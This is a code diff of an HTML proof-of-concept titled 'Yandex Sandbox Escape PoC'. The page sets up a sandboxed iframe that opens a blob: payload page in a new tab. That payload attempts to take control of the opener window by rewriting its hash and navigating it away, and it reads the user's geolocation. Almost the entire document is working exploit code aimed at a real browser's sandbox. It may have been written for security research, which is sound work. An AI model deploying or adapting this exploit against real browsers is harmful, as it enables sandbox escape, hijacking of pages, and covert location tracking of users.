@@ -1,76 +1,109 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Yandex Sandbox Escape PoC</title>
+<title>Yandex Sandbox Escape PoC (no intent, blob target=_blank)</title>
 <style>
-body { font-family: sans-serif; padding: 16px; }
-.log { background: #111; color: #0f0; padding: 10px; font-family: monospace; border-radius: 8px; white-space: pre-wrap; }
-button { padding: 8px 14px; border-radius: 6px; cursor: pointer; }
+  body{font-family:system-ui,Segoe UI,Roboto,sans-serif;padding:16px}
+  .log{background:#0b0f19;color:#d6e4ff;padding:10px;border-radius:10px;font-family:ui-monospace,Consolas,Menlo,monospace;white-space:pre-wrap}
+  .frame{width:100%;max-width:520px;height:260px;border:1px solid #ccc;border-radius:10px}
+  .note{opacity:.8}
+  button,a.btn{display:inline-block;margin:4px 0;padding:10px 14px;border:1px solid #999;border-radius:10px;text-decoration:none}
 </style>
 </head>
 <body>
 <h1>Yandex Sandbox Escape PoC</h1>
-<p>Click karte hi iframe ke andar se popup open hoga taaki block na ho.</p>
+<p class="note">Target: Yandex Browser (Android/desktop). Vector: <code>iframe[sandbox="allow-scripts allow-popups"]</code> → user-gesture link inside iframe opens <code>blob:</code> page in new tab and tries <em>opener</em> control + permission prompt.</p>
 
-<h3>Logs:</h3>
+<h3>Logs</h3>
 <div id="log" class="log"></div>
 
-<!-- Sandboxed iframe -->
-<iframe id="sbx" sandbox="allow-scripts allow-popups" style="width:100%;height:200px;border:1px solid #ccc;"
+<iframe id="sbx" class="frame" sandbox="allow-scripts allow-popups"
 srcdoc="
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html><head><meta charset='utf-8'>
+<style>
+  body{font-family:system-ui,Segoe UI,Roboto,sans-serif;margin:0;padding:12px}
+  .box{border:1px solid #ddd;border-radius:10px;padding:10px}
+  .mono{font-family:ui-monospace,Consolas,Menlo,monospace;white-space:pre-wrap;background:#111;color:#0f0;border-radius:8px;padding:8px}
+  a.btn{display:inline-block;padding:10px 14px;border:1px solid #999;border-radius:10px;text-decoration:none}
+</style>
+</head>
 <body>
-<h3>Iframe: Click niche button to test</h3>
-<button onclick='runTest()'>Open Popup</button>
-<div id=log style=\\"font-family:monospace;white-space:pre-wrap;background:#000;color:#0f0;padding:6px;\\"></div>
-
+<h3>Sandboxed Iframe</h3>
+<p class='mono' id='log'></p>
+<div class='box'>
+  <p>Step: Niche button dabao. Ye <code>blob:</code> HTML banayega aur <code>target=_blank</code> se naya tab khulega.</p>
+  <a id='open' href='#' class='btn'>Open Aux (blob://)</a>
+</div>
 <script>
-function log(x){ document.getElementById('log').textContent += x + '\\n'; try{ parent.postMessage({type:'log', msg:x}, '*'); }catch(e){} }
+  const out = document.getElementById('log');
+  function log(m){ out.textContent += m + '\\n'; try{ parent.postMessage({type:'log', msg:m}, '*'); }catch(e){} }
 
-function runTest(){
-    log('Iframe: Opening about:blank popup...');
-    var w = window.open('about:blank', '_blank');
-    if(!w){ log('Iframe: Popup blocked or sandbox prevented opening'); return; }
+  // payload HTML that will run in the new tab
+  function payloadHTML(){
+    return \`<!DOCTYPE html><html><head><meta charset='utf-8'><title>Aux Window</title>
+<style>body{font-family:system-ui;padding:14px}#o{font-family:ui-monospace,Consolas,Menlo,monospace;white-space:pre-wrap;background:#f6f6f6;padding:8px;border-radius:8px}</style>
+</head><body>
+  <h2>Aux Window (opened from sandboxed iframe)</h2>
+  <div id='o'></div>
+  <script>
+    function p(x){ document.getElementById('o').textContent += x + '\\n'; try{ opener && opener.postMessage({type:'fromAux', msg:x}, '*'); }catch(e){} }
+    p('UA: '+navigator.userAgent);
+    p('Referrer: '+document.referrer);
+    p('Has opener: '+!!window.opener);
 
-    log('Iframe: Popup opened, injecting payload...');
-    var payload = \`<!DOCTYPE html><html><body>
-        <h2>Aux Window</h2>
-        <div id=out></div>
-        <script>
-        function p(m){
-            document.getElementById('out').innerHTML += m+'<br>';
-            try{ opener.postMessage({type:'fromAux', msg:m}, '*'); }catch(e){}
-        }
-        p('Opener access: '+(!!window.opener));
-        try{ opener.location.hash = '#changed'; p('Opener hash change SUCCESS'); }catch(e){ p('Opener hash change BLOCKED: '+e); }
-        try{ opener.location = 'https://example.com/#nav'; p('Opener nav attempt SUCCESS'); }catch(e){ p('Opener nav BLOCKED: '+e); }
-        try{ if(navigator.geolocation){
-            navigator.geolocation.getCurrentPosition(
-                pos => p('Geolocation: '+pos.coords.latitude+','+pos.coords.longitude),
-                err => p('Geo err: '+err.message)
-            );
-        }}catch(e){ p('Geo API blocked: '+e); }
-        <\/script>
-    </body></html>\`;
-    w.location = 'data:text/html,' + encodeURIComponent(payload);
-}
-<\/script>
-</body>
-</html>
+    // Test 1: opener hash write
+    try{ if(opener){ opener.location.hash = '#aux-was-here'; p('Opener hash change: SUCCESS'); } }catch(e){ p('Opener hash change: BLOCKED -> '+e); }
+
+    // Test 2: full navigation of opener
+    try{ if(opener){ opener.location = 'https://example.com/#navigated-by-aux'; p('Opener navigation attempt: TRIGGERED'); } }catch(e){ p('Opener navigation: BLOCKED -> '+e); }
+
+    // Test 3: permission-gated API
+    try{
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => p('Geolocation SUCCESS: '+pos.coords.latitude+','+pos.coords.longitude),
+          err => p('Geolocation error: '+err.code+' / '+err.message)
+        );
+      } else {
+        p('Geolocation not available');
+      }
+    }catch(e){ p('Geolocation call BLOCKED -> '+e); }
+  <\/script>
+</body></html>\`;
+  }
+
+  // Use a real <a target=_blank> (more popup-friendly than window.open in many builds)
+  document.getElementById('open').addEventListener('click', function(e){
+    e.preventDefault();
+    log('Iframe: Constructing blob HTML...');
+    const html = payloadHTML();
+    const url = URL.createObjectURL(new Blob([html], {type:'text/html'}));
+
+    // set href + target and let the user's click open it
+    this.setAttribute('href', url);
+    this.setAttribute('target', '_blank');
+
+    // re-click programmatically only if same-tick navigation didn't happen
+    // (some engines need this double step)
+    setTimeout(()=>{ try{ this.click(); }catch(_){} }, 0);
+
+    log('Iframe: Opened blob:// in new tab? Check Aux page.');
+  });
+</script>
+</body></html>
 "></iframe>
 
 <script>
-const logEl = document.getElementById('log');
-function log(m){ logEl.textContent += m + '\n'; }
+  const logEl = document.getElementById('log');
+  function log(m){ logEl.textContent += m + "\n"; }
 
-// Messages from iframe or aux window
-window.addEventListener('message', e=>{
-    if(e.data.type==='log') log('[IFRAME] ' + e.data.msg);
-    if(e.data.type==='fromAux') log('[AUX] ' + e.data.msg);
-});
+  window.addEventListener('message', (e)=>{
+    if(!e || !e.data) return;
+    if(e.data.type === 'log') log('[IFRAME] ' + e.data.msg);
+    if(e.data.type === 'fromAux') log('[AUX] ' + e.data.msg);
+  });
 </script>
 </body>
 </html>
